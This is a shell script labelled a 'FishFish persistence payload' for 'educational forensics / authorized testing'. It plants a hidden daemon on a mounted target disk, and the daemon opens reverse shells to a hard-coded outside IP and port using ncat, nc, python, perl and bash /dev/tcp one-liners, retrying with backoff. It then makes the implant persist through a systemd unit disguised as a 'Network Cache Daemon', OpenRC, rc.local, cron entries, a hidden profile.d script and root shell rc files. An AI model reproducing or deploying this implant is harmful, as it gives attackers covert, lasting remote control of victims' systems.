#!/bin/sh
# FishFish persistence payload — educational forensics / authorized testing only
# Runs inside FishFish's injection environment (busybox ash).
# All paths MUST be prefixed with $FF_MOUNTPOINT.

VPS_IP="178.104.136.67"
VPS_PORT="58888"
MP="${FF_MOUNTPOINT:-/}"

# --- Config ---
NAME=".cache-update"
HIDDEN_DIR="$MP/usr/local/bin"
PAYLOAD="$HIDDEN_DIR/$NAME"

mkdir -p "$HIDDEN_DIR"

# --- Callback engine (written to target disk) ---
cat > "$PAYLOAD" << 'EOFSH'
#!/bin/sh
# Auto-generated callback daemon
VPS="__IP__"
PORT="__PORT__"
NAME="__NAME__"

# Prevent multiple instances
exec 200>/tmp/.$NAME.lock
flock -n 200 || exit 0

# Retry delay (seconds)
MIN_DELAY=10
MAX_DELAY=300
DELAY=$MIN_DELAY

log() { logger -t "$NAME" "$*" 2>/dev/null || true; }

# Reverse shell implementations, best-to-worst
revshell() {
    # 1. ncat (nmap) — most robust
    if command -v ncat >/dev/null 2>&1; then
        ncat --ssl-verify-ignore "$VPS" "$PORT" -e /bin/sh 2>/dev/null && return 0
        ncat "$VPS" "$PORT" -e /bin/sh 2>/dev/null && return 0
    fi

    # 2. traditional nc with -e
    if command -v nc >/dev/null 2>&1; then
        nc -e /bin/sh "$VPS" "$PORT" 2>/dev/null && return 0
        nc.openbsd -e /bin/sh "$VPS" "$PORT" 2>/dev/null && return 0
        nc.traditional -e /bin/sh "$VPS" "$PORT" 2>/dev/null && return 0
        nc -c /bin/sh "$VPS" "$PORT" 2>/dev/null && return 0
    fi

    # 3. python3
    if command -v python3 >/dev/null 2>&1; then
        python3 -c "
import socket,subprocess,os
s=socket.socket()
s.connect((''$VPS'',$PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(['/bin/sh','-i'])
" 2>/dev/null && return 0
    fi

    # 4. python2
    if command -v python >/dev/null 2>&1; then
        python -c "
import socket,subprocess,os
s=socket.socket()
s.connect((''$VPS'',$PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(['/bin/sh','-i'])
" 2>/dev/null && return 0
    fi

    # 5. perl
    if command -v perl >/dev/null 2>&1; then
        perl -e "
use Socket;
\$i=''$VPS'';\$p=$PORT;
socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));
if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};
" 2>/dev/null && return 0
    fi

    # 6. bash /dev/tcp (fallback of last resort)
    if [ -n "$BASH_VERSION" ] || command -v bash >/dev/null 2>&1; then
        bash -c "bash -i >& /dev/tcp/'$VPS'/'$PORT' 0>&1" 2>/dev/null && return 0
    fi

    return 1
}

# Main loop with exponential backoff
while :; do
    if revshell; then
        DELAY=$MIN_DELAY
    else
        log "Callback failed, retry in ${DELAY}s"
        sleep "$DELAY"
        DELAY=$((DELAY * 2))
        [ "$DELAY" -gt "$MAX_DELAY" ] && DELAY=$MAX_DELAY
    fi
done
EOFSH

# Substitute placeholders
sed -i "s|__IP__|$VPS_IP|g; s|__PORT__|$VPS_PORT|g; s|__NAME__|$NAME|g" "$PAYLOAD"
chmod 755 "$PAYLOAD"

# --- Persistence hooks ---

# 1. systemd (most common on modern Linux)
if [ -d "$MP/etc/systemd/system" ]; then
    mkdir -p "$MP/etc/systemd/system/multi-user.target.wants"
    cat > "$MP/etc/systemd/system/network-daemon.service" << EOF
[Unit]
Description=Network Cache Daemon
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
Restart=always
RestartSec=30
ExecStart=/usr/local/bin/$NAME
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF
    ln -sf /etc/systemd/system/network-daemon.service \
           "$MP/etc/systemd/system/multi-user.target.wants/network-daemon.service" 2>/dev/null || true
fi

# 2. OpenRC (Alpine, Gentoo)
if [ -d "$MP/etc/init.d" ] && [ ! -d "$MP/etc/systemd/system" ]; then
    cat > "$MP/etc/init.d/$NAME" << EOF
#!/sbin/openrc-run
description="Network Cache Daemon"
depend() {
    need net
    after firewall
}
start() {
    ebegin "Starting network-daemon"
    start-stop-daemon --start --background --exec /usr/local/bin/$NAME
    eend \$?
}
stop() {
    ebegin "Stopping network-daemon"
    start-stop-daemon --stop --exec /usr/local/bin/$NAME
    eend \$?
}
EOF
    chmod 755 "$MP/etc/init.d/$NAME"
    ln -sf /etc/init.d/$NAME "$MP/etc/runlevels/default/$NAME" 2>/dev/null || true
fi

# 3. SysVinit / rc.local
if [ -f "$MP/etc/rc.local" ]; then
    grep -v "$NAME" "$MP/etc/rc.local" > /tmp/rc.local.clean
    echo "(nohup /usr/local/bin/$NAME >/dev/null 2>&1 &)" >> /tmp/rc.local.clean
    mv /tmp/rc.local.clean "$MP/etc/rc.local"
    chmod +x "$MP/etc/rc.local"
fi

# 4. Cron (works on almost everything)
if [ -f "$MP/etc/crontab" ]; then
    grep -v "$NAME" "$MP/etc/crontab" > /tmp/crontab.clean 2>/dev/null || cp "$MP/etc/crontab" /tmp/crontab.clean
    echo "@reboot root sleep 20 && /usr/local/bin/$NAME >/dev/null 2>&1 &" >> /tmp/crontab.clean
    echo "*/3 * * * * root pgrep -f '/usr/local/bin/$NAME' >/dev/null || /usr/local/bin/$NAME >/dev/null 2>&1 &" >> /tmp/crontab.clean
    mv /tmp/crontab.clean "$MP/etc/crontab"
fi

# 5. Profile hooks (catches interactive root shells)
mkdir -p "$MP/etc/profile.d"
echo "(pgrep -f '/usr/local/bin/$NAME' >/dev/null || nohup /usr/local/bin/$NAME >/dev/null 2>&1 &)" \
    > "$MP/etc/profile.d/.bash_cache.sh"
chmod +x "$MP/etc/profile.d/.bash_cache.sh"

# 6. root .bashrc
if [ -f "$MP/root/.bashrc" ]; then
    grep -v "$NAME" "$MP/root/.bashrc" > /tmp/bashrc.clean 2>/dev/null || cp "$MP/root/.bashrc" /tmp/bashrc.clean
    echo "(pgrep -f '/usr/local/bin/$NAME' >/dev/null || nohup /usr/local/bin/$NAME >/dev/null 2>&1 &)" >> /tmp/bashrc.clean
    mv /tmp/bashrc.clean "$MP/root/.bashrc"
fi

# 7. root .zshrc (Arch often uses zsh)
if [ -f "$MP/root/.zshrc" ]; then
    grep -v "$NAME" "$MP/root/.zshrc" > /tmp/zshrc.clean 2>/dev/null || cp "$MP/root/.zshrc" /tmp/zshrc.clean
    echo "(pgrep -f '/usr/local/bin/$NAME' >/dev/null || nohup /usr/local/bin/$NAME >/dev/null 2>&1 &)" >> /tmp/zshrc.clean
    mv /tmp/zshrc.clean "$MP/root/.zshrc"
fi

echo "[+] Persisted to $MP — callbacks to $VPS_IP:$VPS_PORT"
